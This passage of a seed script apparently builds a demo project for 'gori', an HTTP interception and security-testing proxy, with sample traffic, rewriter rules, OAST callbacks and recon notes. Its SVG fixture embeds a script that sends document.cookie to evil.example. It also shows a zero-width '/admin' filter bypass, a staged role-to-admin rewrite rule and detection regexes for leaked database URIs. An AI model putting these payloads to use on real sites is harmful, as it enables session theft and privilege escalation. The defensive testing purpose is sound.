  target: "/🔥특가/דוח-מכירות-2026.pdf?ref=🦊&q=한글",
  status: 200, reason: "OK", ctype: "application/pdf",
  resp_body: "%PDF-1.7\n% demo\n", dur_us: 158_000_i64)

# The percent-encoded spelling of a comparable path — same destination, no wide glyphs, and
# 90 characters of `%XX` instead. Worth having beside the row above: one is a width problem
# and the other is a length problem, and a column that handles either can still fail the other.
add_flow(store, tick.call, host: "shop.demo.test",
  target: "/%EA%B2%80%EC%83%89?q=%ED%95%9C%EA%B8%80%20%ED%85%8C%EC%8A%A4%ED%8A%B8&sort=%EC%9D%B8%EA%B8%B0%EC%88%9C",
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"q":"한글 테스트","sort":"인기순","hits":0}), dur_us: 48_000_i64)

# A zero-width space inside `admin`. Zero columns wide, three bytes long, and it is a real
# filter bypass: a rule matching the literal string `/admin` does not fire, and a normalising
# router may route it anyway. On screen the path reads `/a​dmin` — which is the point.
add_flow(store, tick.call, host: "shop.demo.test", target: "/a\u{200B}dmin/users",
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %([{"id":1,"email":"alice@demo.test","role":"customer"},{"id":2,"email":"bob@demo.test","role":"admin"}]),
  dur_us: 66_000_i64)

# A long host and a long path at once: a per-tenant hostname of the shape every cloud console
# hands out, and a signed-URL query string that carries more bytes than the whole rest of the
# row. Both columns are elastic (they share whatever the fixed cells leave over), so this is
# the row that says how the leftover space is split when both sides want all of it.
add_flow(store, tick.call,
  host: "acme-corporation-staging-eu-central-1.tenants.internal.services.demo.test",
  target: "/api/v3/organizations/8f3a1c22-4b7e-11ee-be56-0242ac120002/workspaces/marketing-emea/" \
          "collections/quarterly-reports/items?include=attachments,revisions,acl&fields[item]=id,name,size" \
          "&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Expires=604800&X-Amz-SignedHeaders=host" \
          "&X-Amz-Signature=6f1c0e2adf4b91e07c2d5a8f3b6e1d0c9a7f4e2b8d6c1a5f3e9b7d2c4a6f8e0b",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  status: 200, reason: "OK", ctype: "application/json",
  resp_body: %({"items":[],"page":1,"total":0}), dur_us: 211_000_i64)

# ## The STA, TYPE, SIZE and DUR columns
#
# `Theme.status_color` bands the status into four colours and everything outside 200..599
# falls through to the last one. 999 is not a typo: it is what a bot-defence layer answers
# with when it has decided you are not a browser, and it is the row that shows which band the
# fallthrough picked.
add_flow(store, tick.call, host: "shop.demo.test", target: "/search?q=widget",
  req_headers: {"User-Agent" => "python-requests/2.31.0"},
  status: 999, reason: "Request Denied", ctype: "text/html",
  resp_headers: {"X-Bot-Defense" => "challenge-failed"},
  resp_body: html.call("Denied", "<h1>Request denied</h1><p>Automated traffic.</p>"),
  dur_us: 24_000_i64)

# 206 with a `Content-Range`: a range request is how every video player and every resumed
# download talks, and the SIZE column here reports the SLICE, not the file.
raw_flow(store, tick.call, host: "cdn.demo.test", method: "GET", target: "/media/demo-clip.mp4",
  req_head: "GET /media/demo-clip.mp4 HTTP/1.1\r\nHost: cdn.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
            "Range: bytes=0-1023\r\nAccept: video/*\r\n\r\n",
  status: 206, reason: "Partial Content", ctype: "video/mp4",
  resp_head: "HTTP/1.1 206 Partial Content\r\nServer: nginx/1.25.3\r\nContent-Type: video/mp4\r\n" \
             "Content-Range: bytes 0-1023/48219044\r\nContent-Length: 1024\r\nAccept-Ranges: bytes\r\n\r\n",
  resp_body: Bytes.new(1024) { |i| (i % 251).to_u8 }, dur_us: 71_000_i64)

# 307, which is the redirect that PRESERVES the method and body — a POST redirected here is
# re-POSTed to the new origin, credentials and all, and that is a different fact from the 301
# and 302 rows above.
add_flow(store, tick.call, host: "api.demo.test", method: "POST", target: "/v1/legacy/checkout",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  req_body: %({"cart_id":9,"pay":"card"}),
  status: 307, reason: "Temporary Redirect",
  resp_headers: {"Location" => "https://payments.partner.demo.test/v2/checkout"},
  dur_us: 21_000_i64)

# 405 with an `Allow` header — the answer that tells a hunter which verbs to try next, and
# the reason the METHOD column is worth reading at all.
add_flow(store, tick.call, host: "api.demo.test", method: "DELETE", target: "/v1/products/1000",
  req_headers: {"Authorization" => "Bearer #{jwt}"},
  status: 405, reason: "Method Not Allowed", ctype: "application/json",
  resp_headers: {"Allow" => "GET, HEAD, PUT, PATCH, OPTIONS, QUERY"},
  resp_body: %({"error":"method_not_allowed","allow":["GET","HEAD","PUT","PATCH","OPTIONS","QUERY"]}),
  dur_us: 13_000_i64)

# 417 answering an `Expect: 100-continue` — the handshake where the client WITHHOLDS its body
# until the origin agrees (#728). The request head declares 8 MB of body and the flow carries
# none, because none was ever sent.
raw_flow(store, tick.call, host: "api.demo.test", method: "PUT", target: "/v1/imports/catalog.csv",
  req_head: "PUT /v1/imports/catalog.csv HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: curl/8.6.0\r\n" \
            "Authorization: Bearer #{jwt}\r\nExpect: 100-continue\r\nContent-Type: text/csv\r\n" \
            "Content-Length: 8388608\r\n\r\n",
  status: 417, reason: "Expectation Failed", ctype: "text/plain",
  resp_head: "HTTP/1.1 417 Expectation Failed\r\nServer: nginx/1.25.3\r\nContent-Type: text/plain\r\n" \
             "Content-Length: 38\r\nConnection: close\r\n\r\n",
  resp_body: "upload exceeds the 4 MiB body limit\n".to_slice, dur_us: 340_000_i64)

# 451, which names the authority in a `Link` header rather than in prose, and 429 already has
# a row — so this is the compliance-shaped refusal the demo was missing.
add_flow(store, tick.call, host: "shop.demo.test", target: "/products/1042",
  status: 451, reason: "Unavailable For Legal Reasons", ctype: "text/html",
  resp_headers: {"Link" => "<https://legal.demo.test/orders/2026-114>; rel=\"blocked-by\""},
  resp_body: html.call("Unavailable", "<h1>Unavailable for legal reasons</h1>"),
  dur_us: 18_000_i64)

# 418, because a real API framework really does ship it as its "you sent nonsense" default,
# and a reason phrase can be anything the origin likes — this one is long enough to test what
# the detail pane does with a status line that will not fit.
add_flow(store, tick.call, host: "api.demo.test", method: "POST", target: "/v1/cart/items",
  req_headers: {"Authorization" => "Bearer #{jwt}"}, req_body: %({"sku":null,"qty":-1}),
  status: 418, reason: "I'm a teapot — the request body failed schema validation at $.qty (expected an integer >= 1, got -1)",
  ctype: "application/problem+json",
  resp_body: %({"type":"https://demo.test/errors/validation","title":"Invalid item","status":418,"detail":"qty must be >= 1","instance":"/v1/cart/items"}),
  dur_us: 26_000_i64)

# A body the capture cap CUT. `body_size` is the true wire size (2.5 GB) and the stored blob
# is the first 2 KB, which is exactly the pair the detail pane's "body truncated at capture
# cap, N of M bytes" banner is computed from — and the only way to see that banner without
# actually pulling 2.5 GB through a proxy. The SIZE column reports what the origin SENT.
big_dump = Bytes.new(2048) { |i| (0x20 + (i % 95)).to_u8 }
raw_flow(store, tick.call, host: "internal.demo.test", method: "GET",
  target: "/backups/demoshop-2026-06-19.sql.gz",
  req_head: "GET /backups/demoshop-2026-06-19.sql.gz HTTP/1.1\r\nHost: internal.demo.test\r\n" \
            "User-Agent: gori-demo/1.0\r\nAuthorization: Basic ZGVtbzptZXRyaWNzLXB3\r\n\r\n",
  status: 200, reason: "OK", ctype: "application/octet-stream",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/octet-stream\r\n" \
             "Content-Disposition: attachment; filename=\"demoshop-2026-06-19.sql.gz\"\r\n" \
             "Content-Length: 2684354560\r\n\r\n",
  resp_body: big_dump, resp_body_size: 2_684_354_560_i64, resp_truncated: true,
  dur_us: 214_000_000_i64)

# A long poll that really did hold for three and a half hours before returning one event.
# `Fmt.dur` has an hour tier for exactly this, and nothing in the demo reached it — the
# slowest row was 31 s.
raw_flow(store, tick.call, host: "api.demo.test", method: "GET", target: "/v1/notifications/poll",
  req_head: "GET /v1/notifications/poll HTTP/1.1\r\nHost: api.demo.test\r\nUser-Agent: gori-demo/1.0\r\n" \
            "Authorization: Bearer #{jwt}\r\nX-Poll-Timeout: 14400\r\n\r\n",
  status: 200, reason: "OK", ctype: "application/json",
  resp_head: "HTTP/1.1 200 OK\r\nServer: nginx/1.25.3\r\nContent-Type: application/json\r\n" \
             "Content-Length: 52\r\n\r\n",
  resp_body: %({"events":[{"id":41,"kind":"order.paid","order":9}]}).to_slice,
  dur_us: 12_600_000_000_i64)

# The TYPE column keeps 6 columns for a subtype that `fmt_mime` has already reduced. These
# four are the ones that reduce badly: an Office document type 65 characters long, a
# structured-suffix vendor JSON, a font, and WebAssembly — one row each so the column can be
# looked at rather than reasoned about.
add_flow(store, tick.call, host: "dav.demo.test", target: "/dav/public/q3-final.docx",
  status: 200, reason: "OK",
  ctype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  resp_body: "PK\u{0003}\u{0004}demo-docx-bytes", dur_us: 143_000_i64)

add_flow(store, tick.call, host: "api.demo.test", target: "/v1/orders/9",
  req_headers: {"Accept" => "application/vnd.api+json", "Authorization" => "Bearer #{jwt}"},
  status: 200, reason: "OK", ctype: "application/vnd.api+json",
  resp_body: %({"data":{"type":"orders","id":"9","attributes":{"total":3998,"status":"paid"}}}),
  dur_us: 34_000_i64)

add_flow(store, tick.call, host: "cdn.demo.test", target: "/fonts/inter-var.woff2",
  status: 200, reason: "OK", ctype: "font/woff2",
  resp_headers: {"Cache-Control"               => "public, max-age=31536000, immutable",
                 "Access-Control-Allow-Origin" => "*"},
  resp_body: "wOF2demo-font-bytes", dur_us: 57_000_i64)

add_flow(store, tick.call, host: "cdn.demo.test", target: "/wasm/imagecodecs.wasm",
  status: 200, reason: "OK", ctype: "application/wasm",
  resp_body: "\u{0000}asm\u{0001}\u{0000}\u{0000}\u{0000}demo", dur_us: 128_000_i64)

# An SVG served as an image, which is the one image type that is also a script host — and the
# TYPE column's `svg+xml` special case.
add_flow(store, tick.call, host: "cdn.demo.test", target: "/assets/logo.svg",
  status: 200, reason: "OK", ctype: "image/svg+xml",
  resp_body: %(<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16">) +
             %(<script>fetch('https://evil.example/?c='+document.cookie)</script><circle r="8"/></svg>),
  dur_us: 22_000_i64)

# ## The advisory
#
# The last thing History renders that nothing in the demo produced: `FlowRow#advisory`, gori's
# own prose about an exchange, drawn in the detail pane above the request. This is the real
# text `H2::HeadRewrite#note_skipped` writes when a Match&Replace head rule could not be
# applied because the h2 head has no HTTP/1.1 text form (#517) — the operator's rule did not
# fire, the bytes went out untouched, and the row is the only place that fact exists.
adv_conn = store.insert_h2_connection("api.demo.test", 443, "h2")
store.insert_h2_frame(adv_conn, "out", 0x1_u8, 0x5_u8, 1_u32,
  Bytes[0x82, 0x87, 0x41, 0x8a, 0xa0, 0xe4, 0x1d, 0x13, 0x9d, 0x09, 0xb8, 0xf0, 0x1e, 0x07])
store.insert_h2_frame(adv_conn, "in", 0x1_u8, 0x4_u8, 1_u32, Bytes[0x88, 0x5f, 0x10, 0x61, 0x70, 0x70])
store.flush
raw_flow(store, tick.call, host: "api.demo.test", method: "GET", target: "/v1/me",
  http: "HTTP/2",
  req_head: "GET /v1/me HTTP/2\r\nHost: api.demo.test\r\nuser-agent: gori-demo/1.0\r\n" \
            "authorization: Bearer #{jwt}\r\n\r\n",
  status: 200, ctype: "application/json",
  resp_head: "HTTP/2 200\r\ncontent-type: application/json\r\nx-frame-options: DENY\r\n\r\n",
  resp_body: %({"id":1,"email":"alice@demo.test","role":"customer"}).to_slice,
  dur_us: 43_000_i64, h2_conn_id: adv_conn, h2_stream_id: 1_i64,
  advisory: "Match&Replace was NOT applied to this response head: it has no HTTP/1.1 text form " \
            "(field value contains CR/LF). The fields went out exactly as they arrived, and an " \
            "intercept edit to it would be refused for the same reason (#517)")

store.flush
puts "• inserted act-five column stress: 24 distinct methods (RFC 9110 · WebDAV/DeltaV/DASL · " \
     "PURGE · lowercase `get` · a 40-byte fuzz token), punycode/U-label/homograph hosts, " \
     "wide+RTL+zero-width paths, 206/307/405/417/418/451/501/999, a truncated 2.5 GB body, " \
     "a 3.5 h long poll, 5 exotic content types and an h2 advisory"

# --- Rewriter (Match & Replace rules applied to in-flight traffic) -----------
# A few illustrative rules — the security-hardening two are ON; the rest are OFF so
# they don't silently alter traffic, but are one keystroke (toggle) from live so you
# can flip one on and re-send from Repeater to watch it take effect.
store.insert_rule(S::RuleTarget::Response, S::RulePart::Head, "X-Frame-Options", "DENY",
  op: S::RuleOp::AddHeader, name: "Add X-Frame-Options", enabled: true)
store.insert_rule(S::RuleTarget::Response, S::RulePart::Head, "Server", "",
  op: S::RuleOp::RemoveHeader, name: "Strip Server banner", enabled: true)
store.insert_rule(S::RuleTarget::Request, S::RulePart::Head, "Bearer [A-Za-z0-9._-]+", "Bearer «redacted»",
  op: S::RuleOp::Replace, match_kind: S::MatchKind::Regex, name: "Redact bearer token (regex)", enabled: false)
store.insert_rule(S::RuleTarget::Response, S::RulePart::Body,
  "Welcome to Demo Shop", "Welcome to Demo Shop [rewritten by gori]",
  op: S::RuleOp::Replace, match_kind: S::MatchKind::Literal,
  name: "Brand tag (body-rewrite proof)", host: "shop.demo.test", enabled: false)
store.insert_rule(S::RuleTarget::Response, S::RulePart::Head, "Content-Security-Policy",
  "default-src 'self'; script-src 'self'; object-src 'none'",
  op: S::RuleOp::SetHeader, name: "Force a strict CSP", enabled: false)
store.insert_rule(S::RuleTarget::Request, S::RulePart::Body, %("role":"customer"), %("role":"admin"),
  op: S::RuleOp::Replace, match_kind: S::MatchKind::Literal,
  name: "Privilege flip (request body)", host: "api.demo.test", enabled: false)
store.insert_rule(S::RuleTarget::Request, S::RulePart::Head, "cdn.demo.test/assets/app.min.js",
  "HTTP/1.1 200 OK\r\nContent-Type: application/javascript\r\n\r\nconsole.log('served by gori');\n",
  op: S::RuleOp::ShortCircuit, match_kind: S::MatchKind::Literal,
  name: "Short-circuit the JS bundle", enabled: false)
puts "• inserted 7 rewriter rules (2 active, 5 staged)"

# --- Session bindings: the READ half of the Rewriter tab (extract rules) -----
# An extract rule pulls a value OUT of a response and publishes it as `$name`, which the
# send paths then substitute — so a token that rotates is written once, not pasted into
# every tab. `bound $token` (Repeater) is the tab that consumes these.
store.insert_extract_rule("token", "host:shop.demo.test path:/api/login",
  ExtractKind::JsonPath, selector: "token", host: "shop.demo.test")
store.insert_extract_rule("sid", "host:shop.demo.test path:/api/login",
  ExtractKind::Cookie, selector: "sid", host: "shop.demo.test")
store.insert_extract_rule("cart_id", "host:api.demo.test path:/v1/cart",
  ExtractKind::JsonPath, selector: "cart_id", host: "api.demo.test")
store.insert_extract_rule("csrf", "host:shop.demo.test path:/login",
  ExtractKind::Regex, selector: "name=\"csrf_token\" value=\"([^\"]+)\"",
  host: "shop.demo.test", enabled: false)
store.insert_extract_rule("request_id", "host:api.demo.test",
  ExtractKind::Header, selector: "X-Request-Id", host: "api.demo.test", enabled: false)

# --- Project env vars (`$KEY`, the BUILD-time layer) ------------------------
# Global vars live in settings.json; these are the project's own and follow the db, not
# the operator. They stay literal in every editor and expand only at send time.
Env.save_project(store, [
  {"API", "https://api.demo.test"},
  {"SHOP", "https://shop.demo.test"},
  {"AUTH", "https://auth.demo.test"},
  {"UA", "gori-demo/1.0"},
  {"ADMIN_ID", "2"},
])
puts "• inserted 5 extract rules (bindings) + 5 project env vars"

# --- Colormarker (History row colours — display only, never touches traffic) --
# First enabled match wins, so the order below IS the precedence statement: server errors
# outrank auth failures, which outrank the "interesting" lenses.
store.insert_color_rule("status:5xx", S::MarkerColor::Red.label, S::MarkerStyle::Full, "server errors")
store.insert_color_rule("status:401 OR status:403", S::MarkerColor::Orange.label, S::MarkerStyle::Full, "auth failures")
store.insert_color_rule("host:legacy.demo.test", S::MarkerColor::Purple.label, S::MarkerStyle::Strip, "legacy stack")
store.insert_color_rule("proto:ws", S::MarkerColor::Blue.label, S::MarkerStyle::Strip, "websocket")
store.insert_color_rule("method:POST host:auth.demo.test", S::MarkerColor::Green.label, S::MarkerStyle::Full, "token exchange")
store.insert_color_rule("path:/graphql", S::MarkerColor::Yellow.label, S::MarkerStyle::Strip, "graphql", enabled: false)
# The streaming protocols, both transports — `proto:grpc` and `proto:sse` match the cleartext
# AND the TLS rows (the transport half is a separate term, see `Proto.split_transport`), so
# one rule covers both spellings the PROTO column prints.
store.insert_color_rule("proto:grpc OR proto:sse", S::MarkerColor::Green.label, S::MarkerStyle::Strip,
  "streaming protocols")
# Traffic gori ITSELF sent — a Repeater send, a fuzz hit, a crawl. `src:gori` is the union of
# every tool (built from `FlowSource::Kind#sent_by_gori?`, so it widens on its own as tools
# learn to record), and it deliberately leaves `import` out: a capture read out of someone
# else's file is not gori's traffic either. Last, so the protocol and status lenses above
# still win on a row that is both.
# Yellow on purpose: it is already gori's "you are not seeing what you think" colour — the
# PROTO column paints `STUB` with it for the same reason.
store.insert_color_rule("src:gori", S::MarkerColor::Yellow.label, S::MarkerStyle::Strip,
  "sent by gori, not the client")
puts "• inserted 8 colormarker rules (7 active, 1 staged)"

# --- OAST (out-of-band listener) — provider + session + received callbacks ---
# Seeded to prove the SSRF above out of band. Polling never auto-resumes (see the
# OAST controller), so these are inert historical rows: the tab opens showing the
# two callbacks the server made when it fetched our payload host.
oast_provider = store.insert_oast_provider("Demo OAST (oast.demo.test)",
  Oast::ProviderKind::CustomHttp.label, "https://oast.demo.test", nil, true, 0)
oast_session = store.insert_oast_session(oast_provider,
  Oast::ProviderKind::CustomHttp.label, "https://oast.demo.test",
  "demo7a3f9c2b41d", "s3cr3t-demo-oast", nil, nil)

oast_dns_req = "a1b2c3d4.oast.demo.test.  IN  A\n; recursive lookup from 203.0.113.10 (api.demo.test egress)\n"
store.insert_oast_callback(oast_session, "cb-dns-0001", "dns", nil, "203.0.113.10",
  "a1b2c3d4.oast.demo.test", oast_dns_req.to_slice, nil, t.call(43))

oast_http_req = String.build do |b|
  b << "GET /hook?from=api.demo.test HTTP/1.1\r\n"
  b << "Host: a1b2c3d4.oast.demo.test\r\n"
  b << "User-Agent: DemoFramework/4.2.1 (url-import)\r\n"
  b << "Accept: */*\r\n\r\n"
end
oast_http_resp = "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok"
store.insert_oast_callback(oast_session, "cb-http-0002", "http", "GET", "203.0.113.10",
  "a1b2c3d4.oast.demo.test", oast_http_req.to_slice, oast_http_resp.to_slice, t.call(43) + 900_000_i64)
store.flush
puts "• inserted OAST provider + session + 2 callbacks (dns, http)"

# --- Hostname overrides (per-project /etc/hosts) ----------------------------
# The fictional .test hosts resolve to loopback (they don't exist in real DNS); this
# documents that and shows the override feature. www.hahwul.com is left untouched so
# its flows stay genuinely replayable.
store.add_host_override("shop.demo.test", "127.0.0.1")
store.add_host_override("api.demo.test", "127.0.0.1")
store.add_host_override("cdn.demo.test", "127.0.0.1")
store.add_host_override("auth.demo.test", "127.0.0.1")
store.add_host_override("legacy.demo.test", "127.0.0.1")

# --- Sitemap tags (persisted per (host, path)) ------------------------------
store.set_sitemap_tag("shop.demo.test", "/search", "xss")
store.set_sitemap_tag("shop.demo.test", "/admin", "authz")
store.set_sitemap_tag("api.demo.test", "/v1/debug", "leak")
store.set_sitemap_tag("api.demo.test", "/v1/import", "ssrf")
store.set_sitemap_tag("api.demo.test", "/graphql", "introspection")
store.set_sitemap_tag("shop.demo.test", "/.env", "leak")
store.set_sitemap_tag("shop.demo.test", "/go", "redirect")
store.set_sitemap_tag("shop.demo.test", "/uploads/", "listing")
store.set_sitemap_tag("legacy.demo.test", "/admin/dashboard", "cookie")
store.set_sitemap_tag("auth.demo.test", "/oauth/token", "oauth")

# --- Decoder sub-tabs (per project, pre-loaded with THIS project's material) --
# The Decoder tab restores these on open, so the tool arrives with real work in it
# rather than an empty input: run each chain (^R) and read the result.
Tui::DecoderSessions.to_json([
  {URI.encode_www_form(Base64.strict_encode(saml_xml)), "url-decode > base64-decode", "SAML assertion"},
  {jwt, "jwt-decode", "session JWT"},
  {flask_cookie, "cookie-decode", "Flask session cookie"},
  {"ZGVtbzptZXRyaWNzLXB3", "base64-decode", "Basic auth creds"},
  {"postgresql://demoshop:Sup3rS3cret-db-pw@db.internal.demo.test:5432/demoshop", "sha256", "leaked DSN → sha256"},
]).try { |json| store.set_setting(S::DECODER_SESSIONS_KEY, json) }

# The Rewriter tab's live-preview sample: the request its rules are written against.
store.set_setting(S::REWRITER_SAMPLE_KEY,
  replay_req("GET", "api.demo.test", "/v1/users/1",
    {"Authorization" => "Bearer #{jwt}", "User-Agent" => "gori-demo/1.0"}))
puts "• inserted 5 decoder sub-tabs + a rewriter preview sample"

# --- Probe custom rules (project-scoped) — folded into the passive scan below --
store.insert_probe_custom_rule("Framework version banner",
  "Detects the DemoFramework version string leaked in response bodies.",
  "response", "body", "regex", "DemoFramework \\d+\\.\\d+\\.\\d+", S::Severity::Low)
store.insert_probe_custom_rule("Internal database URI in a client asset",
  "A postgres:// URI with inline credentials shipped to the browser.",
  "response", "body", "regex", "postgres(?:ql)?://[^\"'\\s]+@[^\"'\\s]+", S::Severity::High)
store.insert_probe_custom_rule("Internal 10.x host leaked",
  "An RFC1918 10.0.0.0/8 address disclosed in a response body.",
  "response", "body", "regex", "\\b10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b", S::Severity::Low)
store.insert_probe_custom_rule("Client-side debug header",
  "Requests that carry an X-Debug header — a leftover from local development.",
  "request", "header", "string", "X-Debug:", S::Severity::Info)
puts "• inserted 5 host overrides + 10 sitemap tags + 4 custom probe rules"

# --- Entity links (issues + notes → history / repeater / fuzz / miner) ------
# insert_issue already auto-links the primary flow_id; add cross-workbench refs.
store.add_link(S::LinkOwnerKind::Issue, f1, S::LinkRefKind::Repeater, ids[:repeater_xss])
store.add_link(S::LinkOwnerKind::Issue, f1, S::LinkRefKind::Fuzz, ids[:fuzz_users])
store.add_link(S::LinkOwnerKind::Issue, f1, S::LinkRefKind::Flow, ids[:login])

store.add_link(S::LinkOwnerKind::Issue, f2, S::LinkRefKind::Repeater, ids[:repeater_idor])
store.add_link(S::LinkOwnerKind::Issue, f2, S::LinkRefKind::Fuzz, ids[:fuzz_users])
store.add_link(S::LinkOwnerKind::Issue, f2, S::LinkRefKind::Miner, ids[:miner_users])

store.add_link(S::LinkOwnerKind::Issue, f4, S::LinkRefKind::Repeater, ids[:repeater_xss])

store.add_link(S::LinkOwnerKind::Issue, f6, S::LinkRefKind::Flow, ws_id)

store.add_link(S::LinkOwnerKind::Issue, f7, S::LinkRefKind::Repeater, ids[:repeater_ssrf])
store.add_link(S::LinkOwnerKind::Issue, f7, S::LinkRefKind::Flow, ids[:ssrf])

store.add_link(S::LinkOwnerKind::Issue, f8, S::LinkRefKind::Flow, ids[:oauth_token])
store.add_link(S::LinkOwnerKind::Issue, f8, S::LinkRefKind::Repeater, ids[:repeater_bound])

store.add_link(S::LinkOwnerKind::Issue, f9, S::LinkRefKind::Flow, ids[:django])
store.add_link(S::LinkOwnerKind::Issue, f9, S::LinkRefKind::Flow, ids[:rack])

store.add_link(S::LinkOwnerKind::Issue, f10, S::LinkRefKind::Repeater, ids[:repeater_token])

store.add_link(S::LinkOwnerKind::Issue, f11, S::LinkRefKind::Flow, ids[:oauth_cb])
store.add_link(S::LinkOwnerKind::Issue, f11, S::LinkRefKind::Fuzz, ids[:fuzz_traversal])

store.add_link(S::LinkOwnerKind::Issue, f12, S::LinkRefKind::Fuzz, ids[:fuzz_traversal])
store.add_link(S::LinkOwnerKind::Issue, f12, S::LinkRefKind::Flow, ids[:listing])

store.add_link(S::LinkOwnerKind::Issue, f13, S::LinkRefKind::Flow, ids[:png])

store.add_link(S::LinkOwnerKind::Issue, f17, S::LinkRefKind::Flow, ids[:gql_ws])
store.add_link(S::LinkOwnerKind::Issue, f18, S::LinkRefKind::Flow, ids[:grpc_denied])

NOTE_MAIN  = 1_i64 # stable note id (entity_links.owner_id)
NOTE_LINKS = 2_i64

store.add_link(S::LinkOwnerKind::Note, NOTE_MAIN, S::LinkRefKind::Repeater, ids[:repeater_xss])
store.add_link(S::LinkOwnerKind::Note, NOTE_MAIN, S::LinkRefKind::Fuzz, ids[:fuzz_users])
store.add_link(S::LinkOwnerKind::Note, NOTE_MAIN, S::LinkRefKind::Flow, ids[:cart])

store.add_link(S::LinkOwnerKind::Note, NOTE_LINKS, S::LinkRefKind::Repeater, ids[:repeater_idor])
store.add_link(S::LinkOwnerKind::Note, NOTE_LINKS, S::LinkRefKind::Miner, ids[:miner_users])
store.add_link(S::LinkOwnerKind::Note, NOTE_LINKS, S::LinkRefKind::Flow, ws_id)
store.add_link(S::LinkOwnerKind::Note, NOTE_LINKS, S::LinkRefKind::Repeater, ids[:repeater_hahwul])

puts "• inserted entity links on issues + notes"

# --- Notes doc (multi-tab, stable ids for entity_links) --------------------
NOTE_TOOLS = 3_i64
NOTE_START = 4_i64

note_main = <<-NOTES
# Demo engagement — recon notes

## Hosts
- shop.demo.test    — storefront (HTML)
- api.demo.test     — JSON API (/v1)
- cdn.demo.test     — static assets (EXCLUDED from scope — CDN noise)
- auth.demo.test    — OAuth 2.0 / OIDC authorization server
- legacy.demo.test  — the old stack: Flask, Django and Rack apps, plus :8080 metrics
- www.hahwul.com    — REAL, live site (replayable)

## Auth
- POST /api/login -> bearer token (ALSO leaked in JSON body, not just cookie)
- token used as `Authorization: Bearer ...` on /v1/*
- the token is a real HS256 JWT — weakly signed (see the JWT lead below)
- there is a SECOND auth path: OAuth code flow on auth.demo.test → /oauth/token
  returns access_token + id_token (a different JWT) + refresh_token
- legacy.demo.test runs framework-signed session cookies instead (Flask/Django/Rack)

## Leads
- [x] reflected XSS on /search?q=
- [x] IDOR on /v1/users/{id}  (customer token reads admin's PII)
- [x] blind SSRF on POST /v1/import  (confirmed out-of-band, see OAST tab)
- [x] JWT signed with a guessable secret  (crack + re-forge in the JWT tab)
- [x] Flask/Django cookies signed with the same weak secret (Decoder → `cookie-decode`)
- [x] CORS reflects any Origin WITH credentials on /v1/cart
- [x] /.env served in the clear (DB + mail passwords, APP_KEY)
- [x] open redirect on /go?next=  — chains with the OAuth redirect_uri
- [x] source map + an inline postgres:// DSN in the production bundle
- [x] verbose 500 on /v1/debug
- [ ] check /admin (403) for auth bypass / header tricks
- [ ] enumerate /v1/users/{id} range (Fuzzer session "user id enum" is staged)
- [ ] replay the OAuth code — is it single-use? ("oauth code entropy" sequencer is staged)

## Where these flows came from
The SRC column says who put each request on the wire, and everything without a tag is
`PROXY` — traffic this target's own client sent through gori. Five rows are not:

- `RPTR` twice — the same IDOR probe re-sent by hand from the Repeater tab and by an agent
  through MCP `send_request`. Same tool, different surface; open either and the request pane
  ends with `sent by gori — repeater (tui)` / `(mcp)` and the repeater session it came from.
- `FUZZ` — one hit out of the "path traversal" sweep, recorded because the run asked for
  evidence. The `.env` it returns is real, but the PAYLOAD is gori's: reading this row without
  the SRC column would be reading your own request back as a finding.
- `CRAWL` — a Discover fetch. Crawls have been persisted by default since the tab shipped.
- `IMPRT` — read out of `partner-webhooks.har`, not sent by gori at all. That is why
  `src:gori` leaves it out while `-src:proxy` keeps it.

`src:` takes the long tokens and the column's short tags alike (`src:rptr` = `src:repeater`),
and `source:` is accepted as a synonym. A flow captured before gori recorded provenance shows
`—` and falls out of `src:` in BOTH directions, the way a Pending flow falls out of `status:`
and `-status:`. This project is freshly seeded, so it holds no such row.

## Protocols on this target
Sort History by the PROTO column (or filter `proto:ws` / `proto:grpc` / `proto:sse`) — every
label the column can print is in here, cleartext spellings included.

- **WebSocket** GET /ws/chat (101) — open it and switch to the MESSAGES pane (→ sent, ← received).
  Three more sockets sit beside it:
  - `ws://legacy.demo.test:8080/ws/notify` — CLEARTEXT (`WS`, not `WSS`), and it puts the
    session JWT in its first frame. Its transcript also carries an unmasked client frame, a
    3-fragment message, PING/PONG, an RSV1 probe, a `[gori]` advisory row and a CLOSE with a code.
  - `CONNECT /ws/notifications` — a WebSocket over HTTP/2 (RFC 8441): no 101 anywhere, just an
    extended CONNECT answered 200. The `X-Gori-Protocol: websocket` marker line is what makes it a
    WebSocket; the FRAMES pane holds the h2 frames underneath.
  - `/mqtt` — MQTT, an application protocol that is not HTTP at all, tunnelled through a socket.
    Every frame is binary; the handshake's `Sec-WebSocket-Protocol: mqtt` is what names the bytes.
  - `/graphql` (101) — a graphql-transport-ws SUBSCRIPTION. The document travels inside a frame,
    so this flow has no body to decode and still offers a GRAPHQL pane.
- **gRPC** POST /demo.Greeter/SayHello (HTTP/2) — FRAMES pane shows the raw h2 frame log;
  the application/grpc body deframes into length-prefixed protobuf messages (a schema-less
  wire-format tree — `p` toggles it back to hex). Five more, each a different shape:
  - `/demo.Prices/Watch` — SERVER STREAMING: four messages on one stream. A second copy of the
    call was cut mid-frame, so the pane frames what it can and says the rest is short.
  - `/demo.Admin/GetStats` — HTTP 200, grpc-status **7 PERMISSION_DENIED**. The trailers carry the
    real answer; `X-Gori-Trailers` names the fields that arrived in the trailing HEADERS block.
  - `/demo.Greeter/SayHello` answered by a proxy's `text/html` **502** — still gRPC in the PROTO
    column and under `proto:grpc`, because the REQUEST said so.
  - `legacy.demo.test:8081/demo.Legacy/ListUsers` — cleartext h2c (`GRPC`), unauthenticated.
  - the grpc-web-text variant over HTTP/1.1 — the whole framed stream is base64, and its trailers
    ride INSIDE the body as a 0x80-flagged frame.
- **SSE** GET /v1/stream/prices (text/event-stream) — captured as one streamed body; the EVENTS
  pane parses it. `http://legacy.demo.test:8080/internal/events` is the cleartext one (multi-line
  `data:`, an event with no type), and `/v1/stream/orders` was dropped mid-event (ABT).
